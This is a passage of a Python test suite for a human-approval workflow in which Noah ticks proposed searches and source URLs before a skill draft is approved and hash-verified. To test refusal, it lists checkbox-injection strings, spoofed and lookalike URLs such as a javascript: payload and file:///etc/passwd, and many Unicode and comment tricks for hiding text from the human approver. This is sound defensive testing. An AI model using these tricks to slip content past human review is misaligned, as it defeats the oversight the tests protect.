import datetime as dt
import hashlib
import os
import tempfile
import unittest
from pathlib import Path

from forge import Forge, ForgeError, NotDecided, canonical_url, skill_hash
from forge import checklist
from forge.core import LOCK, S_APPROVED, S_REDRAFT, S_REVIEW, S_SEARCH, S_SHELVED, S_SOURCE
from library import Library, LibraryError, PathRefused
from library import frontmatter as fm

T0 = dt.datetime(2026, 10, 26, 9, 30, tzinfo=dt.timezone.utc)
RID = "2026-10-26_pdf-summarizer"
URL = "https://example.com/docs/Page?a=1"
URL2 = "https://docs.example.org/guide"


class Clock:
    def __init__(self):
        self.now = T0

    def __call__(self):
        self.now += dt.timedelta(minutes=1)
        return self.now


class ForgeTestCase(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.base = Path(tmp.name)
        self.root = self.base / "lib"
        self.outside = self.base / "outside"
        self.outside.mkdir()
        self.clock = Clock()
        self.lib, _ = Library.init(self.root, clock=self.clock)
        self.forge = Forge(self.lib)

    # ---------------------------------------------------------------- helpers

    def p(self, rel):
        return self.root / rel

    def text(self, rel):
        return self.p(rel).read_text(encoding="utf-8")

    def meta(self, rel):
        return fm.parse(self.text(rel))[0]

    def status(self, folder=f"35-forge/{RID}"):
        return self.meta(f"{folder}/state.md")["status"]

    def tick(self, rel, contains, mark="x"):
        path = self.p(rel)
        lines = path.read_text(encoding="utf-8").split("\n")
        hits = [i for i, line in enumerate(lines) if line.startswith("- [ ] ") and contains in line]
        self.assertEqual(len(hits), 1, f"expected one unticked line containing {contains!r}")
        lines[hits[0]] = f"- [{mark}] " + lines[hits[0]][6:]
        path.write_text("\n".join(lines), encoding="utf-8")

    def set_review(self, key, value, rid=RID):
        rel = f"35-forge/{rid}/review.md"
        meta, body = fm.parse(self.text(rel))
        meta[key] = value
        self.p(rel).write_text(fm.render(meta, body), encoding="utf-8")

    def set_decision(self, decision, rid=RID):
        self.set_review("decision", decision, rid)

    def make_draft(self, files=None, name="draft"):
        files = files or {
            "SKILL.md": "---\nname: pdf-summarizer\n---\n# PDF summarizer\n\n1. Read the PDF.\n",
            "manifest.md": "inputs: a PDF path\noutputs: a summary\nreads: 10-sources/pdf/\n",
            "code/run.py": "print('hi')\n",
        }
        d = self.base / name
        for rel, content in files.items():
            (d / rel).parent.mkdir(parents=True, exist_ok=True)
            (d / rel).write_text(content, encoding="utf-8")
        return d

    def new(self, title="PDF Summarizer!", text="Please make a skill that summarizes PDFs.\n"):
        return self.forge.new(title, text)

    def to_sources(self, rid=RID):
        """new -> searches proposed and one ticked -> sources proposed and URL ticked."""
        self.assertEqual(self.new(), rid)
        self.forge.propose_searches(rid, [("pdf summarization techniques", "learn the methods"),
                                          ("pdf text extraction python", "how to read PDFs")])
        self.tick(f"35-forge/{rid}/searches.md", "pdf summarization techniques")
        self.forge.propose_sources(rid, [(URL, "Docs page", "covers methods", "the method list"),
                                         (URL2, "Guide", "background", "nothing yet")])
        self.tick(f"35-forge/{rid}/sources.md", URL)

    def ingest(self, rid=RID, url=URL, forge_key=None, topic="pdf"):
        src = self.base / "fetched.md"
        meta = {"title": "Docs page", "source": url, "forge": forge_key or rid}
        src.write_text(fm.render(meta, "\nfetched text\n"), encoding="utf-8")
        res = self.lib.file(src, topic, source=url)
        return res.item

    def to_review(self, rid=RID):
        self.to_sources(rid)
        self.forge.record_ingest(rid, URL, self.ingest(rid))
        return self.forge.draft_skill(rid, self.make_draft())


# -------------------------------------------------------------------- scaffolding

class NewTest(ForgeTestCase):
    def test_scaffold_verbatim_request_and_state(self):
        raw = "Make a skill:\r\n  - summarize PDFs\r\n\r\nÜnïcode and a trailing space \n---\nnot a header\n"
        # (library init creates 35-forge/ now; the forge also creates it on demand)
        rid = self.forge.new("PDF Summarizer!", raw)
        self.assertEqual(rid, RID)
        folder = self.p(f"35-forge/{rid}")
        self.assertEqual(sorted(os.listdir(folder)), ["request.md", "searches.md", "state.md"])
        meta, body = fm.parse(self.p(f"35-forge/{rid}/request.md").read_bytes().decode("utf-8"))
        self.assertEqual(body, raw)  # byte for byte after the header
        self.assertEqual(meta["request"], rid)
        state = self.meta(f"35-forge/{rid}/state.md")
        self.assertEqual(state["status"], S_SEARCH)
        self.assertIn("2026-10-26T09:3", self.text(f"35-forge/{rid}/state.md"))
        boxes, bad = checklist.parse_boxes(self.text(f"35-forge/{rid}/searches.md"))
        self.assertEqual((boxes, bad), ([], []))  # template only; the intro's `- [x]` is not a box
        self.assertFalse(fm.validate(state))  # library header fields complete

    def test_id_collision_gets_suffix_and_shelf_ids_are_reserved(self):
        self.assertEqual(self.new(), RID)
        self.assertEqual(self.new(), RID + "-2")
        os.rename(self.p(f"35-forge/{RID}"), self.base / "moved")  # free the name ...
        shelf = self.p("95-shelf/pdf-summarizer")
        shelf.parent.mkdir(exist_ok=True)
        os.rename(self.base / "moved", shelf)  # ... but a shelved request still holds its id
        self.assertEqual(self.new(), RID + "-3")

    def test_empty_request_and_bad_title_refused(self):
        with self.assertRaises(ForgeError):
            self.forge.new("x", "  \n")
        with self.assertRaises(ForgeError):
            self.forge.new("a\nb", "text")


# -------------------------------------------------------------------- searches

class SearchesTest(ForgeTestCase):
    def test_proposals_are_unticked_appended_and_never_touch_noahs_ticks(self):
        self.new()
        rel = f"35-forge/{RID}/searches.md"
        self.assertEqual(self.forge.propose_searches(RID, [("q one", "why one"), ("q two", "why two")]), 2)
        self.assertIn("- [ ] q one — why: why one\n", self.text(rel))
        self.assertEqual(self.forge.approved_queries(RID), [])
        self.assertEqual(self.status(), S_SEARCH)  # unchanged until Noah ticks
        self.tick(rel, "q one")
        self.assertEqual(self.forge.propose_searches(RID, [("q one", "again"), ("q three", "new")]), 1)
        self.assertEqual(self.forge.approved_queries(RID), ["q one"])
        self.assertEqual(self.text(rel).count("q one"), 1)

    def test_edited_query_is_what_is_approved(self):
        self.new()
        rel = f"35-forge/{RID}/searches.md"
        self.forge.propose_searches(RID, [("rocm pytorch install", "set up the GPU")])
        self.p(rel).write_text(self.text(rel).replace(
            "- [ ] rocm pytorch install —", "- [x] rocm 6.2 pytorch install ubuntu —"), encoding="utf-8")
        self.assertEqual(self.forge.approved_queries(RID), ["rocm 6.2 pytorch install ubuntu"])
        self.assertTrue(self.forge.is_query_approved(RID, "rocm 6.2 pytorch install ubuntu"))
        self.assertFalse(self.forge.is_query_approved(RID, "rocm pytorch install"))  # the original

    def test_query_match_is_exact(self):
        self.new()
        self.forge.propose_searches(RID, [("cafe near me", "w")])
        self.tick(f"35-forge/{RID}/searches.md", "cafe")
        self.assertTrue(self.forge.is_query_approved(RID, "cafe near me"))
        for variant in ("cafe near me ", " cafe near me", "Cafe near me", "cafe\u0301 near me",
                        "cafe  near me", "c\u0430fe near me", "", None, "cafe near me\n", "caf\u00e9 near me"):
            self.assertFalse(self.forge.is_query_approved(RID, variant), repr(variant))

    def test_injection_in_proposals_refused(self):
        self.new()
        for query, why in (("x\n- [x] evil — why: e", "w"), ("x", "w\n- [x] evil — why: e"),
                           ("a\tb", "w"), ("a — why: b", "w"), ("x", ""), ("", "w"), ("[x] q", "w")):
            with self.assertRaises(ForgeError, msg=repr((query, why))):
                self.forge.propose_searches(RID, [(query, why)])
        self.assertEqual(checklist.parse_boxes(self.text(f"35-forge/{RID}/searches.md"))[0], [])

    def test_malformed_checkbox_lines_are_ignored_and_reported(self):
        self.new()
        rel = f"35-forge/{RID}/searches.md"
        extra = "\n".join([
            "-[x] no space — why: w",
            "- [x ] inner space — why: w",
            "* [x] star bullet — why: w",
            "  - [x] indented — why: w",
            "- [y] wrong mark — why: w",
            "- [x] no separator here",
            "- [x]  — why: empty query",
            "- [x]glued — why: w",
            "```",
            "- [x] fenced — why: w",
            "```",
            "<!--",
            "- [x] commented — why: w",
            "-->",
            "<!-- - [x] inline comment — why: w -->",
            "- [X] upper ok — why: w",
            "- [x] double hyphen -- why: w",
            "",
        ])
        self.p(rel).write_text("﻿" + self.text(rel).replace("\n", "\r\n") + extra, encoding="utf-8")
        self.assertEqual(self.forge.approved_queries(RID), ["upper ok"])
        info = self.forge.request_info(RID)
        # 8 shapes, the commented-out box and the '--' separator (the inline comment line does
        # not start like a box, so it is silently ignored)
        self.assertEqual(len(info.warnings), 10, info.warnings)
        self.assertEqual(info.queries, (1, 1))


# -------------------------------------------------------------------- sources and URLs

class SourcesTest(ForgeTestCase):
    def test_propose_sources_before_any_approval_refused(self):
        self.new()
        self.forge.propose_searches(RID, [("q", "w")])
        with self.assertRaisesRegex(ForgeError, "no search is approved"):
            self.forge.propose_sources(RID, [(URL, "t", "w", "k")])
        self.assertFalse(os.path.lexists(self.p(f"35-forge/{RID}/sources.md")))
        self.assertEqual(self.status(), S_SEARCH)

    def test_sources_lines_status_and_dedup(self):
        self.to_sources()
        self.assertEqual(self.status(), S_SOURCE)
        text = self.text(f"35-forge/{RID}/sources.md")
        self.assertIn(f"- [x] `{URL}` — title: Docs page — why: covers methods — take: the method list\n", text)
        self.assertIn(f"- [ ] `{URL2}` — title: Guide", text)
        self.assertEqual(self.forge.propose_sources(RID, [("HTTPS://EXAMPLE.COM/docs/Page?a=1", "t", "w", "k")]), 0)
        self.assertEqual(self.forge.approved_urls(RID), [URL])

    def test_bad_source_rows_refused(self):
        self.new()
        self.forge.propose_searches(RID, [("q", "w")])
        self.tick(f"35-forge/{RID}/searches.md", "- [ ] q")
        for row in (("ftp://example.com/x", "t", "w", "k"), ("https://u:p@example.com/", "t", "w", "k"),
                    ("https://exämple.com/", "t", "w", "k"), (URL, "t\nx", "w", "k"), (URL, "t", "w", "")):
            with self.assertRaises(ForgeError, msg=repr(row)):
                self.forge.propose_sources(RID, [row])

    def test_idn_hosts_are_flagged_for_noah(self):
        self.new()
        self.forge.propose_searches(RID, [("q", "w")])
        self.tick(f"35-forge/{RID}/searches.md", "- [ ] q")
        self.forge.propose_sources(RID, [("https://xn--exmple-cua.com/", "t", "w", "k")])
        self.assertIn('displays as "exämple.com"', self.text(f"35-forge/{RID}/sources.md"))
        self.tick(f"35-forge/{RID}/sources.md", "xn--exmple-cua")  # the note itself passes the rules
        self.assertEqual(self.forge.approved_urls(RID), ["https://xn--exmple-cua.com/"])

    def test_url_approval_is_exact_and_lookalikes_are_refused(self):
        self.to_sources()
        self.assertTrue(self.forge.is_url_approved(RID, URL))
        self.assertTrue(self.forge.is_url_approved(RID, "HTTPS://EXAMPLE.COM/docs/Page?a=1"))  # scheme/host case
        lookalikes = [
            URL + "/", "https://example.com/docs/Page/?a=1", "https://example.com/docs/page?a=1",
            "https://example.com/docs/Page?A=1", "https://example.com/docs/Page?a=1&b=2",
            "https://example.com/docs/Page", "https://example.com/docs/Page?a=1#frag",
            "http://example.com/docs/Page?a=1", "https://example.com:443/docs/Page?a=1",
            "https://example.com./docs/Page?a=1", "https://user@example.com/docs/Page?a=1",
            "https://example.com@evil.com/docs/Page?a=1", "https://evil.com#@example.com/docs/Page?a=1",
            "https://exаmple.com/docs/Page?a=1",          # Cyrillic а
            "https://Kexample.com/docs/Page?a=1",       # Kelvin sign lowercases to k
            "https://xn--exmple-cua.com/docs/Page?a=1",    # punycode
            "https://example.com\\@evil.com/docs/Page?a=1", " " + URL, URL + " ", URL + "\n",
            "https://example.com/docs/Page?a=1\x00", "javascript:alert(1)", "//example.com/docs/Page?a=1",
            "file:///etc/passwd", URL2,  # listed but not ticked
            "", None,
        ]
        for url in lookalikes:
            self.assertFalse(self.forge.is_url_approved(RID, url), repr(url))

    def test_url_checks_need_the_right_state_and_request(self):
        self.new()
        self.forge.propose_searches(RID, [("q", "w")])
        self.tick(f"35-forge/{RID}/searches.md", "- [ ] q")
        self.assertTrue(self.forge.is_query_approved(RID, "q"))
        self.assertFalse(self.forge.is_url_approved("2026-10-26_other", URL))
        self.assertFalse(self.forge.is_query_approved("../35-forge/" + RID, "q"))
        self.assertFalse(self.forge.is_query_approved("2026-02-30_bad-date", "q"))

    def test_record_ingest(self):
        self.to_sources()
        item = self.ingest()
        self.assertEqual(self.forge.record_ingest(RID, URL, item), item)
        state = self.meta(f"35-forge/{RID}/state.md")
        self.assertEqual(state["ingested"], [f"{URL} -> {item}"])
        # Unticked URL, an approved URL filed with a different source, a missing forge key,
        # paths outside 10-sources and traversal: all refused, state unchanged.
        before = self.text(f"35-forge/{RID}/state.md")
        cases = [
            (URL2, self.ingest(url=URL2), "not ticked"),
            (URL, self.ingest(url=URL2), "source:"),
            (URL, self.ingest(forge_key="2026-10-26_other"), "forge:"),
            (URL, f"35-forge/{RID}/request.md", "10-sources"),
            (URL, "../outside/x.md", "'..'"),
            (URL, str(self.outside / "x.md"), "outside"),
            ("https://user@example.com/docs/Page?a=1", item, "user info"),
        ]
        for url, path, msg in cases:
            with self.assertRaisesRegex(LibraryError, msg):
                self.forge.record_ingest(RID, url, path)
        self.assertEqual(self.text(f"35-forge/{RID}/state.md"), before)


class CanonicalUrlTest(unittest.TestCase):
    def test_canonical(self):
        self.assertEqual(canonical_url("HTTP://Example.COM:8080/A/b?Q=1"), "http://example.com:8080/A/b?Q=1")
        self.assertEqual(canonical_url("https://1.2.3.4/x"), "https://1.2.3.4/x")
        self.assertEqual(canonical_url("https://[2001:DB8::1]/x"), "https://[2001:db8::1]/x")
        self.assertEqual(canonical_url("https://example.com"), "https://example.com")

    def test_refused(self):
        for url in ("https://user@example.com/", "https://:@example.com/", "https://example.com:0/",
                    "https://example.com:99999/", "https://exa mple.com/", "https://ex_ample.com/",
                    "https://-example.com/", "https://example.com:80:80/", "https://[::1/",
                    "https:///path", "https://%65xample.com/", "data:text/html,x", "https:example.com",
                    "https://example.com/" + "a" * 3000, "https://bücher.de/",
                    # minor 5 and lookalike hosts from the review (f2)
                    "https://example.com/a#frag", "https://good.example#@evil.example",
                    "https://evil.example#good.example/docs", "http://0x7f.1/", "http://127.1/",
                    "http://2130706433/", "http://0177.0.0.1/", "https://1.2.3.4./", "https://example.com./",
                    "https://example.com/<script>", 'https://example.com/"x"', "https://example.com/`x`"):
            with self.assertRaises(ValueError, msg=url):
                canonical_url(url)


# -------------------------------------------------------------------- hashing

class HashTest(ForgeTestCase):
    def test_definition(self):
        d = self.make_draft({"b.md": "B", "a/z.txt": "Z", "SKILL.md": "S"})
        h = hashlib.sha256()
        for rel, data in (("SKILL.md", b"S"), ("a/z.txt", b"Z"), ("b.md", b"B")):
            h.update(b"file\0" + rel.encode() + b"\0" + str(len(data)).encode() + b"\0" + data)
        self.assertEqual(skill_hash(d), "sha256:" + h.hexdigest())
        (d / "CHANGELOG.md").write_text("ignored")
        self.assertEqual(skill_hash(d), "sha256:" + h.hexdigest())
        os.rename(d / "b.md", d / "c.md")  # a rename changes the hash
        self.assertNotEqual(skill_hash(d), "sha256:" + h.hexdigest())

    def test_no_ambiguity_between_name_and_content(self):
        one = self.make_draft({"ab": "c"}, name="one")
        two = self.make_draft({"a": "bc"}, name="two")
        self.assertNotEqual(skill_hash(one), skill_hash(two))

    def test_symlink_refused(self):
        d = self.make_draft({"SKILL.md": "S"})
        os.symlink(self.outside, d / "link")
        with self.assertRaises(PathRefused):
            skill_hash(d)


# -------------------------------------------------------------------- draft and decide

class LifecycleTest(ForgeTestCase):
    def test_full_happy_path(self):
        skill, digest, warning = self.to_review()
        self.assertEqual((skill, warning), ("pdf-summarizer", None))
        base = f"35-forge/{RID}"
        self.assertEqual(self.status(), S_REVIEW)
        review = self.meta(f"{base}/review.md")
        self.assertEqual(review["decision"], "pending")
        self.assertEqual(review["hash"], digest)
        self.assertEqual(digest, skill_hash(self.p(f"{base}/skill")))
        self.assertEqual(len(review["files"]), 3)
        with self.assertRaises(NotDecided):
            self.forge.decide(RID)
        self.assertFalse(self.forge.is_query_approved(RID, "pdf summarization techniques"))  # no new searches

        state_before = self.text(f"{base}/state.md")
        self.set_decision("approve")
        res = self.forge.decide(RID)
        self.assertEqual((res.decision, res.location, res.hash, res.edited),
                         ("approve", "30-skills/pdf-summarizer", digest, []))
        dest = self.p("30-skills/pdf-summarizer")
        self.assertEqual(sorted(os.listdir(dest)), ["CHANGELOG.md", "SKILL.md", "code", "manifest.md"])
        self.assertEqual((dest / "code/run.py").read_text(), "print('hi')\n")
        changelog = self.meta("30-skills/pdf-summarizer/CHANGELOG.md")
        self.assertEqual(changelog["approved_hash"], digest)
        self.assertIn(f"approved from forge request {RID}, as drafted", self.text("30-skills/pdf-summarizer/CHANGELOG.md"))
        res = self.forge.verify("pdf-summarizer")
        self.assertEqual((res.ok, res.approved, res.current, res.problems), (True, digest, digest, []))
        self.assertEqual(self.status(), S_APPROVED)
        self.assertFalse(os.path.lexists(self.p(f"{base}/skill")))
        self.assertEqual(self.meta(f"{base}/review.md")["approved_hash"], digest)
        # The log is append-only: the old body is a prefix of the new one.
        body_before = fm.parse(state_before)[1]
        body_after = fm.parse(self.text(f"{base}/state.md"))[1]
        self.assertTrue(body_after.startswith(body_before))
        self.assertEqual(len(body_after.splitlines()) - len(body_before.splitlines()), 1)
        log = [line for line in body_after.splitlines() if line.startswith("- ")]
        self.assertEqual([line.split(" ", 2)[2].split(" ")[0] for line in log],
                         ["created", "proposed", "proposed", "ingested", "drafted", "Noah"])
        # A change after approval needs a new decision.
        (dest / "code/run.py").write_text("print('changed')\n")
        res = self.forge.verify("pdf-summarizer")
        self.assertFalse(res.ok)
        self.assertNotEqual(res.approved, res.current)
        self.assertEqual(len(res.problems), 3)  # CHANGELOG, state.md and review.md all disagree

    def test_double_decide_refused_by_state_and_by_lock(self):
        self.to_review()
        self.set_decision("approve")
        lock = self.p(f"35-forge/{LOCK}")
        lock.write_text("held by another forge command\n")
        with self.assertRaisesRegex(ForgeError, "another forge command"):
            self.forge.decide(RID)
        self.assertEqual(self.status(), S_REVIEW)
        self.assertTrue(lock.exists())  # someone else's lock is never removed
        os.unlink(lock)  # (test cleanup standing in for the other command finishing)
        self.forge.decide(RID)
        with self.assertRaisesRegex(ForgeError, "while the request is approved"):
            self.forge.decide(RID)
        self.assertFalse(lock.exists())

    def test_draft_hash_noah_edit_then_approve(self):
        _, drafted, _ = self.to_review()
        base = f"35-forge/{RID}"
        (self.p(f"{base}/skill/SKILL.md")).write_text("# Noah's better version\n", encoding="utf-8")
        (self.p(f"{base}/skill/notes.md")).write_text("added by Noah\n", encoding="utf-8")
        edited = skill_hash(self.p(f"{base}/skill"))
        self.assertNotEqual(edited, drafted)
        self.set_decision("approve")
        # The draft has code/, so changed content needs Noah's hash confirmation (M1).
        with self.assertRaisesRegex(NotDecided, f"confirm_hash: {edited[7:15]}"):
            self.forge.decide(RID)
        self.set_review("confirm_hash", "deadbeef")
        with self.assertRaisesRegex(NotDecided, "does not match"):
            self.forge.decide(RID)
        self.assertEqual(self.status(), S_REVIEW)
        self.assertFalse(os.path.lexists(self.p("30-skills/pdf-summarizer")))
        self.set_review("confirm_hash", edited[7:15])
        res = self.forge.decide(RID)
        self.assertEqual(res.hash, edited)
        self.assertEqual(res.edited, ["SKILL.md (changed)", "notes.md (added)"])
        review = self.meta(f"{base}/review.md")
        self.assertEqual((review["hash"], review["approved_hash"]), (drafted, edited))
        changelog = self.text("30-skills/pdf-summarizer/CHANGELOG.md")
        self.assertIn("with Noah's edits since the draft", changelog)
        self.assertIn(drafted, changelog)
        self.assertTrue(self.forge.verify("pdf-summarizer").ok)

    def test_deny_shelf_revive_round_trip_keeps_sources(self):
        self.to_review()
        base = f"35-forge/{RID}"
        sources_bytes = self.p(f"{base}/sources.md").read_bytes()
        searches_bytes = self.p(f"{base}/searches.md").read_bytes()
        draft_hash = skill_hash(self.p(f"{base}/skill"))
        self.set_decision("deny")
        res = self.forge.decide(RID)
        shelf = "95-shelf/pdf-summarizer"
        self.assertEqual((res.decision, res.location), ("deny", shelf))
        self.assertFalse(os.path.lexists(self.p(base)))
        self.assertEqual(self.status(shelf), S_SHELVED)
        self.assertEqual(self.p(f"{shelf}/sources.md").read_bytes(), sources_bytes)
        self.assertEqual(skill_hash(self.p(f"{shelf}/skill")), draft_hash)
        self.assertFalse(self.forge.is_url_approved(RID, URL))  # nothing is fetched for a shelved request
        with self.assertRaisesRegex(ForgeError, "no request"):
            self.forge.decide(RID)  # a second decide finds nothing to decide
        self.assertEqual(self.forge.request_info(RID).status, S_SHELVED)

        self.assertEqual(self.forge.revive("pdf-summarizer"), RID)
        self.assertFalse(os.path.lexists(self.p(shelf)))
        self.assertEqual(self.status(), S_REVIEW)
        self.assertEqual(self.p(f"{base}/sources.md").read_bytes(), sources_bytes)
        self.assertEqual(self.p(f"{base}/searches.md").read_bytes(), searches_bytes)
        self.assertEqual(self.meta(f"{base}/review.md")["decision"], "pending")
        self.assertEqual(len(self.meta(f"{base}/state.md")["ingested"]), 1)  # the ingest record survives
        with self.assertRaises(ForgeError):
            self.forge.propose_searches(RID, [("new search", "w")])  # no new searches after revive
        with self.assertRaises(ForgeError):
            self.forge.revive("pdf-summarizer")
        self.set_decision("approve")
        self.assertEqual(self.forge.decide(RID).hash, draft_hash)

    def test_second_denial_of_same_skill_gets_numbered_shelf(self):
        self.to_review()
        self.set_decision("deny")
        self.forge.decide(RID)
        rid2 = self.new()
        self.assertEqual(rid2, RID + "-2")
        self.forge.propose_searches(rid2, [("q", "w")])
        self.tick(f"35-forge/{rid2}/searches.md", "- [ ] q")
        self.forge.propose_sources(rid2, [(URL, "t", "w", "k")])
        self.forge.draft_skill(rid2, self.make_draft(name="d2"))
        self.set_decision("deny", rid2)
        self.assertEqual(self.forge.decide(rid2).location, "95-shelf/pdf-summarizer-2")
        self.assertEqual(self.forge.revive("pdf-summarizer-2"), rid2)

    def test_revise_then_redraft_keeps_the_previous_draft(self):
        _, first, _ = self.to_review()
        base = f"35-forge/{RID}"
        self.set_decision("revise")
        res = self.forge.decide(RID)
        self.assertEqual(res.decision, "revise")
        self.assertEqual(self.status(), S_REDRAFT)
        self.assertTrue(os.path.isdir(self.p(f"{base}/skill")))  # nothing moved
        self.assertTrue(self.forge.is_url_approved(RID, URL))  # may still fetch approved sources
        _, second, _ = self.forge.draft_skill(RID, self.make_draft(
            {"SKILL.md": "# v2\n"}, name="v2"), name="pdf-summarizer")
        self.assertNotEqual(first, second)
        self.assertEqual(skill_hash(self.p(f"{base}/previous/1/skill")), first)
        self.assertEqual(self.meta(f"{base}/previous/1/review.md")["decision"], "revise")
        self.assertEqual(self.meta(f"{base}/review.md")["decision"], "pending")
        self.assertEqual(self.status(), S_REVIEW)

    def test_bad_decisions(self):
        self.to_review()
        for value in ("maybe", "approved", ""):
            self.set_decision(value)
            with self.assertRaises(ForgeError):
                self.forge.decide(RID)
        self.set_decision("APPROVE")  # case is forgiven
        self.assertEqual(self.forge.decide(RID).decision, "approve")

    def test_draft_rules(self):
        self.to_sources()
        cases = [
            ({"README.md": "x"}, "no SKILL.md"),
            ({"SKILL.md": "x", "CHANGELOG.md": "x"}, "CHANGELOG"),
            ({"SKILL.md": "x", "code/a.py": "x"}, "manifest.md"),
        ]
        for i, (files, msg) in enumerate(cases):
            with self.assertRaisesRegex(ForgeError, msg):
                self.forge.draft_skill(RID, self.make_draft(files, name=f"bad{i}"))
        with self.assertRaisesRegex(ForgeError, "kebab"):
            self.forge.draft_skill(RID, self.make_draft({"SKILL.md": "x"}, name="bad9"), name="Bad Name")
        self.assertEqual(self.status(), S_SOURCE)
        skill, _, _ = self.forge.draft_skill(RID, self.make_draft({"SKILL.md": "no header"}, name="ok"))
        self.assertEqual(skill, "pdf-summarizer")  # from the request title

    def test_draft_before_sources_refused(self):
        self.new()
        with self.assertRaisesRegex(ForgeError, "not allowed while the request is awaiting-search-approval"):
            self.forge.draft_skill(RID, self.make_draft())

    def test_approve_over_an_existing_skill_archives_it_and_keeps_history(self):
        self.to_review()
        self.set_decision("approve")
        first = self.forge.decide(RID).hash
        rid2 = self.new()
        self.forge.propose_searches(rid2, [("q", "w")])
        self.tick(f"35-forge/{rid2}/searches.md", "- [ ] q")
        self.forge.propose_sources(rid2, [(URL, "t", "w", "k")])
        self.forge.draft_skill(rid2, self.make_draft({"SKILL.md": "# v2\n"}, name="v2"), name="pdf-summarizer")
        self.set_decision("approve", rid2)
        second = self.forge.decide(rid2).hash
        self.assertTrue(os.path.isdir(self.p("90-archive/30-skills/pdf-summarizer")))
        changelog = self.text("30-skills/pdf-summarizer/CHANGELOG.md")
        self.assertIn(first, changelog)
        self.assertIn(second, changelog)
        self.assertLess(changelog.index(second), changelog.index(first))  # newest first
        self.assertTrue(self.forge.verify("pdf-summarizer").ok)

    def test_status_overview(self):
        self.to_review()
        infos, problems = self.forge.all_requests()
        self.assertEqual(problems, [])
        self.assertEqual(len(infos), 1)
        info = infos[0]
        self.assertEqual((info.status, info.queries, info.sources, info.ingested, info.decision, info.skill),
                         (S_REVIEW, (1, 2), (1, 2), 1, "pending", "pdf-summarizer"))
        self.assertIn("next: Noah: read skill/", info.summary())


# -------------------------------------------------------------------- review round 1

CANARY = "acct 4111-1111"
TAGGED = "".join(chr(0xE0000 + ord(c)) for c in CANARY)
# The reviewer's f1 cases: each hides text from Noah in a line he would tick.
HIDDEN_QUERIES = [
    "rocm install guide" + TAGGED,                         # Unicode tag characters
    "rocm​‌‍⁠ driver",                 # zero-width characters
    "‮gnp.tohsneercs",                                # RTL override
    "amd gpu <!-- " + CANARY + " --> tuning",              # inline HTML comment
    "rocm guide ‒ why: plain text " + CANARY,         # figure dash fakes the separator
    "rocm guide　x",                              # NBSP / ideographic space
    "rocm️ guide",                                    # variation selector
    "rocm\U000f0000 guide",                                # private use
    "rocm ⁦x⁩ guide",                            # bidi isolate
    "see `code` here", "a <b> tag", "q − why: minus sign", "q - why: hyphen",
    "q ⸺ why: two-em dash",                           # another Pd dash
    "q ㅤ filler",                                     # Hangul filler (printable but blank)
]


class HiddenTextTest(ForgeTestCase):
    """B1: no invisible or render-hidden text can ride along in an approved query or source."""

    def setUp(self):
        super().setUp()
        self.new()
        self.searches = f"35-forge/{RID}/searches.md"

    def test_hidden_queries_refused_at_propose_time(self):
        for query in HIDDEN_QUERIES:
            with self.assertRaises(ForgeError, msg=repr(query)):
                self.forge.propose_searches(RID, [(query, "official docs")])
            with self.assertRaises(ForgeError, msg=repr(query)):
                self.forge.propose_searches(RID, [("plain query", "why " + query)])
        self.assertEqual(checklist.parse_boxes(self.text(self.searches))[0], [])

    def test_hidden_queries_pasted_and_ticked_are_not_approved_and_reported(self):
        lines = [f"- [x] {q} — why: pasted by Noah\n" for q in HIDDEN_QUERIES]
        with open(self.p(self.searches), "a", encoding="utf-8") as fh:
            fh.write("- [x] clean query — why: fine\n" + "".join(lines))
        self.assertEqual(self.forge.approved_queries(RID), ["clean query"])
        for q in HIDDEN_QUERIES:
            self.assertFalse(self.forge.is_query_approved(RID, q), repr(q))
        info = self.forge.request_info(RID)
        not_approved = [w for w in info.warnings if "NOT approved" in w or "comment" in w]
        self.assertEqual(len(not_approved), len(HIDDEN_QUERIES), info.warnings)
        self.assertEqual(info.queries, (1, 1))

    def test_hidden_text_in_source_fields_refused(self):
        self.forge.propose_searches(RID, [("q", "w")])
        self.tick(self.searches, "- [ ] q")
        for bad in ("t" + TAGGED, "a​b", "<!-- x -->", "`x`", "x — why: y", "‮x"):
            for row in ((URL, bad, "w", "k"), (URL, "t", bad, "k"), (URL, "t", "w", bad)):
                with self.assertRaises(ForgeError, msg=repr(row)):
                    self.forge.propose_sources(RID, [row])
        self.assertFalse(os.path.lexists(self.p(f"35-forge/{RID}/sources.md")))

    def test_hidden_text_in_a_ticked_source_line_is_not_approved(self):
        self.forge.propose_searches(RID, [("q", "w")])
        self.tick(self.searches, "- [ ] q")
        self.forge.propose_sources(RID, [(URL, "t", "w", "k")])
        rel = f"35-forge/{RID}/sources.md"
        with open(self.p(rel), "a", encoding="utf-8") as fh:
            fh.write(f"- [x] `{URL2}` — title: t{TAGGED} — why: w — take: k\n")
            fh.write("- [x] `https://example.net/a` — title: <!-- hidden --> — why: w — take: k\n")
        self.assertEqual(self.forge.approved_urls(RID), [])
        self.assertFalse(self.forge.is_url_approved(RID, URL2))
        self.assertEqual(len(self.forge.request_info(RID).warnings), 2)

    def test_comment_opened_mid_line_disables_following_lines(self):
        """Minor 2 (f4): `<!--` anywhere on a line opens a comment."""
        with open(self.p(self.searches), "a", encoding="utf-8") as fh:
            fh.write("Old ideas, disabled <!--\n- [x] old secret query — why: w\n-->\n"
                     "- [x] after <!-- a --> comment — why: w\n- [x] live — why: w\n")
        self.assertEqual(self.forge.approved_queries(RID), ["live"])
        self.assertFalse(self.forge.is_query_approved(RID, "old secret query"))


# Review round 2 (f5): lookalike separators and blank glyphs that passed the visible-character
# rules. Queries and justifications are printable ASCII now (CONTRACTS §12.9, round 2).
F5_SPOOFS = {
    "box-drawing dash U+2500": f"rocm guide ─ why: official docs {CANARY}",
    "katakana long vowel U+30FC": f"rocm guide ー why: official docs {CANARY}",
    "CJK one U+4E00": f"rocm guide 一 why: official docs {CANARY}",
    "hyphen bullet U+2043": f"rocm guide ⁃ why: official docs {CANARY}",
    "Cyrillic h in why": f"rocm guide — wһy: official docs {CANARY}",
    "fullwidth colon": f"rocm guide — why： official docs {CANARY}",
    "modifier colon U+A789": f"rocm guide — why꞉ official docs {CANARY}",
    "combining mark after dash": f"rocm guide —́ why: official docs {CANARY}",
    "combining mark on w": f"rocm guide — ẉhy: official docs {CANARY}",
    "NBSP before dash": f"rocm guide — why: official docs {CANARY}",
    "Hangul filler": f"rocm guideㅤ{CANARY}",
    "braille blank": f"rocm guide⠀{CANARY}",
    "Khitan filler U+16FE4": "rocm guide" + "\U00016fe4" * 5,
    "Egyptian full blank U+13441": f"rocm guide\U00013441{CANARY}",
    "Egyptian blank U+13442": f"rocm guide\U00013442{CANARY}",
